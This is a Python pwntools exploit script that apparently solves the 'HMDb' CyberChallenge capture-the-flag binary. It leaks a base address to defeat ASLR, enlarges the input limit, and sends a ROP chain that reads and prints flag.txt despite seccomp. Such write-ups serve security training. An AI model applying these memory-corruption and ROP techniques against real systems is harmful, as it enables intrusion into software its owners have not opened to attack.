#!/usr/bin/env python3

from pwn import *

exe = ELF("./HMDb")

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("hmdb.challs.cyberchallenge.it", 9219)

    return r


def details(index: int):
    r.sendlineafter(b'> ', f"details {index}".encode("ascii"))
    output = r.recvlines(4)
    return output


def list():
    r.sendlineafter(b'> ', b"list")
    output = r.recvlines(27)
    return output


def get_aslr():
    # 26° film has no trailing newline so "details" read the next entry as well
    # (address of the link).
    output = details(26)[0][-6:]    # [0] is the Title; we will read the last 6 bytes (ASLR)

    # Since the link is at offset 0x16E0 in the rodata section, we can subtract it
    # and get the base address
    exe.address = int.from_bytes(output, byteorder = 'little') - 0x16E0
    log.info(f"Base address is  {hex(exe.address)}")


def increase_input_length():
    # When we give in input "13" as the index for details (13 - 1 = 12), we can get into
    # an if-statement which prints a phrase and increases "n" (the maximum input length)
    # by the length of that phrase (which is 31).
    # So we can increase it enough by iterating "details" a few times
    for _ in range(3):
        details(13)


def read_flag():
    # Despite checksec telling us that canary is enabled, it isn't actually used so we don't
    # have to bother about it.
    # Moreover we have a seccomp policy applied for this binary, so we can't execute any program,
    # but we can open and read from files.
    # We just need to put the pointer of "flag.txt" into the RDI register and we can read the flag.

    # 0x10c7: lea rdi, [rsp - 0x3b]; ret;
    lea_rdi_rsp = exe.address + 0x10C7
    ret         = exe.address + 0x10CC

    # 0x1313: pop rdi; ret;
    pop_rdi_ret = exe.address + 0x1313

    payload =  b'quit\x00./flag.txt\x00' + b'A' * 40
    payload += p64(lea_rdi_rsp)             # Loads the string "./flag.txt" which is 5 bytes after the start of buffer
    payload += p64(ret)                     # Additional return address to align the stack
    payload += p64(exe.address + 0x1079)    # Call "read_from_file" function
    payload += p64(pop_rdi_ret)             # Pops the buffer's address into RDI register
    payload += p64(exe.address + 0x2027E0)  # buffer's address used to store the content
    payload += p64(exe.plt['printf'])       # Call "printf" to print the content (stack is already aligned for this call)
    payload += p64(exe.plt['exit'])         # Exits gracefully

    r.sendlineafter(b'> ', payload)
    log.success(f"Flag obtained: {r.recvlineS()}")


# NOTE: Sometimes this won't work due to null bytes in the base address.
#       Just run until it works
def main():
    r = conn()

    get_aslr()
    increase_input_length()
    read_flag()


if __name__ == "__main__":
    main()
